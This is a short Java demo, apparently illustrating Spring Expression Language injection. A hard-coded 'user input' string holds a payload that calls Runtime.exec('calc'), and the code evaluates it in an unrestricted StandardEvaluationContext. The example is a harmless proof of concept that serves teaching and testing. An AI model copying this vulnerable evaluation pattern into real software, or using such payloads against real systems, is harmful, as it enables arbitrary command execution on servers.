package org.example.spel;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class SpelInjectionExample {
    public static void main(String[] args) {
        String userInput = "(2 * 3 > 0) ? T(java.lang.Runtime).getRuntime().exec('calc') : 0"; // 注入的代码

        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();

        try {
            Object result = parser.parseExpression(userInput).getValue(context);
            System.out.println("Result: " + result);
        } catch (Exception e) {
            e.printStackTrace();
            System.err.println("Error: " + e.getMessage());
        }
    }
}